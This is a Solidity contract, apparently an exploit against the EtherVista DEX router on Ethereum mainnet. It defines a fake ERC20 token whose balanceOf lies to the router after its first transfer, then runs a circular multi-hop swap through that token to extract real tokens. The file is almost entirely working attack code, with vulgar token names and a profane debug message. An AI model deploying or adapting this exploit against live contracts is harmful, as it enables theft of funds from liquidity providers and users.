// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {ERC20} from "src/ERC20.sol";

interface EtherVistaFactory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface EtherVistaRouter {
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function launch(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        uint8 buyLpFee,
        uint8 sellLpFee,
        uint8 buyProtocolFee,
        uint8 sellProtocolFee,
        address protocolAddress
    ) external payable;

    function usdcToEth(uint256 amount) external view returns (uint256);
}

contract FakeToken is ERC20, Test {
    EtherVistaRouter constant ROUTER = EtherVistaRouter(0xEAaa41cB2a64B11FE761D41E747c032CdD60CaCE);
    EtherVistaFactory constant FACTORY = EtherVistaFactory(0x9a27cb5ae0B2cEe0bb71f9A85C0D60f3920757B4);
    ERC20 constant WETH = ERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);


    uint256 beFunky = 0;

    constructor() {
    }

    function name() public pure override returns (string memory) {
        return "Big Pussy";
    }

    function symbol() public pure override returns (string memory) {
        return "Sohai";
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (msg.sender == address(ROUTER) && beFunky == 1) {
            return 1e9 ether;
        }
        if (msg.sender == address(ROUTER) && beFunky == 2) {
            console.log("FUCK");
        }
        return 1e14;
    }

    function transfer(address to, uint256 value) public override returns (bool) {
        beFunky += 1;
        return super.transfer(to, value);
    }

    function initialize() external payable {
        _approve(address(this), address(ROUTER), type(uint256).max);
        _mint(address(this), 10 ether);

        ROUTER.launch{value: 10}(address(this), 1e14, 0, 0, 0, 0, 255, 255, address(this));
    }


    function buy(address token, uint256 minOut) external payable {
        address[] memory path = new address[](4);
        path[0] = address(WETH);
        path[1] = address(this);
        path[2] = address(WETH);
        path[3] = address(token);

        uint256 preBalance = ERC20(token).balanceOf(msg.sender);
        
        bytes memory data = abi.encodeWithSelector(
            ROUTER.swapExactETHForTokensSupportingFeeOnTransferTokens.selector,
            0,
            path,
            msg.sender,
            block.timestamp
        );

        (bool success, bytes memory returnData) = address(ROUTER).call{value: msg.value}(data);
        require(success, "Router call failed");

        uint256 postBalance = ERC20(token).balanceOf(msg.sender);
        require(postBalance > preBalance + minOut, "No enough tokens received");
    }

    receive() external payable {}
}